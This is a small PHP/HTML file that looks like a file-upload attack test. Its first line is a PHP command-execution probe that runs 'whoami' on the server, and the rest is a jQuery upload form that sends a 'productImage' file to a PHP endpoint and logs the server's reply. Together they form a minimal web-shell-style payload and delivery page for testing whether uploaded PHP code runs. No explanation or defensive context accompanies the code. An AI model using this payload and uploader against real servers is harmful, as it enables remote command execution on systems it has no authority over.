<?php echo exec('whoami'); ?>
<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
    <input id="productImage" type="file" name="productImage" />
    <button id="upload">Upload</button>
<script>
    $('#upload').on('click', function() {
        var file_data = $('#productImage').prop('files')[0];
        var form_data = new FormData();
        form_data.append('productImage', file_data);
        $.ajax({
            url: 'lesssgooo.php', // <-- point to server-side PHP script
            dataType: 'text',  // <-- what to expect back from the PHP script, if anything
            cache: false,
            contentType: false,
            processData: false,
            data: form_data,
            type: 'post',
            success: function(php_script_response){
                console.log(php_script_response); // <-- display response from the PHP script, if any
            }
        });
    });
</script>
